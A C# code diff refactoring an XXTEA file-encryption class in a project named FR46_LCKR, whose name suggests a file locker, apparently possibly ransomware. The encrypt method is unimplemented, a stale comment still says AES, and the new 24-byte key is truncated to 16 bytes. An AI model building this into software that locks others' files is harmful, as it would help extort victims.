@@ -3,57 +3,65 @@ using System.Security.Cryptography;
 using System.Text;
 namespace FR46_LCKR.CLASS
 {
-    internal class xXteaE_Provider : IFil_Crypt
+    internal class XXteaE_Provider : IFil_Crypt
     {
         private readonly UTF8Encoding utf8 = new UTF8Encoding();
         private byte[] EncryptionKey { get; set; }
 
         //Create AES encryption K
 
-        public byte[] Create_ECrypt_Key()
+        public byte[] CreateEncryptionKey()
         {
-            var kP = new AesCryptoServiceProvider
+            var keyProvider = new TripleDESCryptoServiceProvider
             {
-                KeySize = 128
+                KeySize = 192
             };
-            kP.GenerateKey();
+            keyProvider.GenerateKey();
 
-            var K = kP.Key;
+            var key = keyProvider.Key;
 
-            kP.Dispose();
-            EncryptionKey = K;
-            return K;
+            keyProvider.Dispose();
+            EncryptionKey = key;
+            return key;
         }
 
-        //return encryption K
-
-        public byte[] Get_ECrypt_Key()
+        /// <summary>
+        /// Returns the encryption key
+        /// </summary>
+        /// <returns></returns>
+        public byte[] GetEncryptionKey()
         {
             return EncryptionKey;
         }
 
-        public byte[] ECrypt_Bytes(byte[] fileBytes, byte[] encryptionKey)
+        /// <summary>
+        /// Encrypts the given bytes with the key
+        /// </summary>
+        /// <param name="fileBytes">Bytes to encrypt</param>
+        /// <param name="encryptionKey">Encryption key</param>
+        /// <returns></returns>
+        public byte[] EncryptBytes(byte[] fileBytes, byte[] encryptionKey)
         {
             throw new NotImplementedException();
         }
 
-        private const UInt32 delta = 0x9E3778B9;
+        private const UInt32 delta = 0x9E3779B9;
 
-        private UInt32 MX(UInt32 sum, UInt32 y, UInt32 z, Int32 p, UInt32 e, UInt32[] l)
+        private UInt32 MX(UInt32 sum, UInt32 y, UInt32 z, Int32 p, UInt32 e, UInt32[] k)
         {
-            return (z >> 5 ^ y << 2) + (y >> 3 ^ z << 4) ^ (sum ^ y) + (l[p & 3 ^ e] ^ z);
+            return (z >> 5 ^ y << 2) + (y >> 3 ^ z << 4) ^ (sum ^ y) + (k[p & 3 ^ e] ^ z);
         }
 
-        private Byte[] Encrypt(Byte[] data, Byte[] K)
+        private Byte[] Encrypt(Byte[] data, Byte[] key)
         {
             if (data.Length == 0)
             {
                 return data;
             }
-            return ToByteArray(Encrypt(ToUInt32Array(data, true), ToUInt32Array(FixKey(K), false)), false);
+            return ToByteArray(Encrypt(ToUInt32Array(data, true), ToUInt32Array(FixKey(key), false)), false);
         }
 
-        private UInt32[] Encrypt(UInt32[] v, UInt32[] l)
+        private UInt32[] Encrypt(UInt32[] v, UInt32[] k)
         {
             Int32 n = v.Length - 1;
             if (n < 1)
@@ -71,26 +79,26 @@ namespace FR46_LCKR.CLASS
                     for (p = 0; p < n; p++)
                     {
                         y = v[p + 1];
-                        z = v[p] += MX(sum, y, z, p, e, l);
+                        z = v[p] += MX(sum, y, z, p, e, k);
                     }
-                    y =v[0];
-                    z = v[n] += MX(sum, y, z, p, e, l);
+                    y = v[0];
+                    z = v[n] += MX(sum, y, z, p, e, k);
                 }
             }
             return v;
         }
 
-        private Byte[] FixKey(Byte[] K)
+        private Byte[] FixKey(Byte[] key)
         {
-            if (K.Length == 16) return K;
+            if (key.Length == 16) return key;
             Byte[] fixedkey = new Byte[16];
-            if (K.Length < 16)
+            if (key.Length < 16)
             {
-                K.CopyTo(fixedkey, 0);
+                key.CopyTo(fixedkey, 0);
             }
             else
             {
-                Array.Copy(K, 0, fixedkey, 0, 16);
+                Array.Copy(key, 0, fixedkey, 0, 16);
             }
             return fixedkey;
         }
@@ -98,7 +106,7 @@ namespace FR46_LCKR.CLASS
         private UInt32[] ToUInt32Array(Byte[] data, Boolean includeLength)
         {
             Int32 length = data.Length;
-            Int32 n = (((length & 3) == 0) ? (length >> 2) : ((length >> 2) +1));
+            Int32 n = (((length & 3) == 0) ? (length >> 2) : ((length >> 2) + 1));
             UInt32[] result;
             if (includeLength)
             {
@@ -115,6 +123,7 @@ namespace FR46_LCKR.CLASS
             }
             return result;
         }
+
         private Byte[] ToByteArray(UInt32[] data, Boolean includeLength)
         {
             Int32 n = data.Length << 2;
@@ -131,7 +140,7 @@ namespace FR46_LCKR.CLASS
             Byte[] result = new Byte[n];
             for (Int32 i = 0; i < n; i++)
             {
-                result[i] = (Byte)(data[i >> 2] >> ((i & 3)<<3));
+                result[i] = (Byte)(data[i >> 2] >> ((i & 3) << 3));
             }
             return result;
         }
